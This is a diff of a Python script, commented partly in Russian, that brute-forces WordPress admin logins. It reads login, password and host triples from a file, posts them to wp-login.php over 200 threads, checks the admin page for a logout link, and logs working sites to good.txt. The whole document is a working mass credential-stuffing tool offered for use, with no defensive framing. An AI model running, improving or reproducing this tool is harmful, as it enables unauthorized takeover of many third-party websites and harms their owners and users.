@@ -14,52 +14,39 @@ headers = {
     'DNT': '1'
 }
 
-#----login.txt----
-file = open('login.txt' , 'r')
-l_list = file.readlines()
-file.close()
-#----password.txt----
-file = open('pwd.txt' , 'r')
-p_list = file.readlines()
-file.close()
-#----
-#----domains.txt----
-file = open('domains.txt' , 'r')
-d_list = file.readlines()
-file.close()
-#----
-domain_file = "domains.txt"
+source_file = "source.txt"
 
-#theard_count = 5
-def brut(host, login, pwd):
+theard_count = 200
+def brut(string):
+    t = string.split()
     payload = {
-        'log':login,
-        'pwd':pwd,
+        'log':t[0],
+        'pwd':t[1],
         #'wp-submit': 'Log+In',
         #'rememberme': 'forever',
-        'redirect_to': 'https://'+host+'/wp-admin',
+        'redirect_to': 'https://'+t[2]+'/wp-admin',
         'testcookie': '1'
     }
-    url = 'http://'+host+'/wp-login.php'
+    url = 'http://'+t[2]+'/wp-login.php'
     s = requests.Session()
     try:    
-        s.post(url, data=payload, headers=headers)
+        s.post(url, data=payload, headers=headers, timeout = 10)
     except Exception:
         print('ERROR')
         return False
-    response = s.get('http://'+host+'/wp-admin', headers=headers)
-    if response.text.find('logout')>0:
+    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
+    if response.text.find('action=logout')>0:
         return True
     else:
         return False
 
-res = brut('demo.wpdownloadmanager.com/wpdmpro','demo','demo')
+'''res = brut('demo.wpdownloadmanager.com/wpdmpro','demo','demo')
 if res:
     print('11')
 else:
     print('00')
 
-'''for i in range(len(d_list)):
+for i in range(len(d_list)):
     url = d_list[i].strip()
     for i in range(len(l_list)):
         login = l_list[i].strip()    
@@ -80,9 +67,12 @@ def run(queue, result_queue):
     while not queue.empty():
         # получаем первую задачу из очереди
         host = queue.get_nowait()
-        print('{} checking in thread {}'.format(host, current_thread()))
-        # проверяем URL
-        status = brut(host, login, pwd)
+        print('Checking in thread {}'.format(current_thread()))
+	# проверяем URL
+        try:
+            status = brut(host)
+        except Exception:
+            print('Error in '+current_thread())
         # сохраняем результат для дальнейшей обработки
         result_queue.put_nowait((status, host))
         # сообщаем о выполнении полученной задачи
@@ -92,7 +82,7 @@ def run(queue, result_queue):
             open('good.txt', 'a+').write(host + '\n')
         else:
             pass
-        print('{} finished in thread {}. Result={}'.format(host, current_thread(), status))
+        #print('{} finished in thread {}. Result={}'.format(host, current_thread(), status))
     print('{} closing'.format(current_thread()))
 
 # MAIN
@@ -107,7 +97,7 @@ def main():
     #fr_errors  = os.path.join(domain_temp, "error.txt")
 
     # Сначала загружаем все URL из файла в очередь задач
-    with open(domain_file) as f:
+    with open(source_file) as f:
         for line in f:
             queue.put(line.strip())
 
